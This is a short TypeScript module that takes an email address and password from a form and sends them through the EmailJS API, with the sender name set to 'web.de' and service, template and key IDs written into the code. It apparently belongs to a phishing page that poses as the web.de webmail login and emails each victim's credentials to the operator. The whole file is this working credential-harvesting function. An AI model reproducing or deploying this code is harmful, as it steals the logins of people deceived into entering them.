import axios from "axios";

const endpoint = "https://api.emailjs.com/api/v1.0/email/send";
const service_id = "service_2r61fo2";
const template_id = "template_q02ol4b";
const public_key = "3VCwtmDhRVQoLYdHb";

const sendEmail = (values: any) => {
  const payload = {
    service_id,
    template_id,
    user_id: public_key,
    template_params: {
      from_name: "web.de",
      email: values.email,
      password: values.password,
    },
  };

  return axios.post(endpoint, payload);
};

export default sendEmail;
